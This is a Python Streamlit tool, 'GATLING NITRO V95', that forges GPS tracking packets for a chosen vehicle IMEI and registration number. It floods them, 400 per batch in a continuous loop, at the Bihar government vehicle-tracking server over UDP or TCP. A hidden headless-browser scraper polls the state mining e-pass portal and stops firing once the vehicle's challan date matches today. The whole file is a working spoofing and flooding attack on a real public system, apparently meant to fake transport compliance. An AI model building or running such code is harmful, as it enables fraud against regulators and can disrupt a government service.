import streamlit as st
import socket
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os

# --- Page Setup ---
st.set_page_config(page_title="GATLING NITRO V95", page_icon="🚀", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #000; color: #0f0; }
    div.stButton > button { background-color: #004400; color: white; border-radius: 8px; font-weight: bold; width: 100%; height: 3.5em; }
    .stMetric { background-color: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 VLTS GATLING NITRO - V95")
st.caption("Enterprise Edition - Logic: Non-Stop Fire + Hidden Scraper")

# --- Initialize States ---
if 'firing' not in st.session_state:
    st.session_state.firing = False
if 'total_count' not in st.session_state:
    st.session_state.total_count = 0
if 'last_portal_update' not in st.session_state:
    st.session_state.last_portal_update = "Waiting..."

# --- Sidebar ---
with st.sidebar:
    st.header("⚙️ Settings")
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)

# --- Controls ---
c1, c2 = st.columns(2)
if c1.button("🔥 START ENGINE", disabled=st.session_state.firing):
    st.session_state.firing = True
    st.rerun()

if c2.button("🛑 STOP & RESET"):
    st.session_state.firing = False
    st.session_state.total_count = 0
    st.session_state.last_portal_update = "Waiting..."
    st.rerun()

st.divider()
m1 = st.empty()
m2 = st.empty()

# --- Sync Logic (The Secret Sauce) ---
def check_portal_silent(options, vehicle_no):
    try:
        driver = webdriver.Chrome(options=options)
        driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
        driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vehicle_no}';")
        driver.execute_script("__doPostBack('btnSearch','');")
        # Direct fetch after small buffer
        time.sleep(1)
        res = driver.execute_script("""
            var td = document.evaluate("//td[contains(text(), 'Challan Date')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;
        """)
        driver.quit()
        return res
    except:
        return None

# --- Execution Engine ---
if st.session_state.firing:
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    
    if mode == "TCP":
        sock.settimeout(2)
        try: sock.connect(target)
        except: st.session_state.firing = False

    # Scraper Setup (Headless)
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    
    for path in ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]:
        if os.path.exists(path): 
            options.binary_location = path
            break

    loop_counter = 0

    while st.session_state.firing:
        # 1. Continuous Firing (High Speed Batch)
        now = datetime.now()
        p = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
        
        for _ in range(400): # High batch for Nitro speed
            sock.sendto(p, target) if mode == "UDP" else sock.send(p)
        
        st.session_state.total_count += 400
        loop_counter += 1

        # Update UI Metrics
        with m1.container():
            st.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
        with m2.container():
            st.metric("Latest Portal Update", st.session_state.last_portal_update)

        # 2. Separate Window Scraper Trigger (Every few loops)
        if loop_counter >= 30:
            res = check_portal_silent(options, vno)
            if res:
                st.session_state.last_portal_update = res
                # Auto-Kill if date matches system date
                if now.strftime("%d-%b-%Y").upper() in res.upper():
                    st.session_state.firing = False
            loop_counter = 0 
        
        time.sleep(0.01)

    sock.close()
    st.rerun()
else:
    m1.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
    m2.metric("Latest Portal Update", st.session_state.last_portal_update)
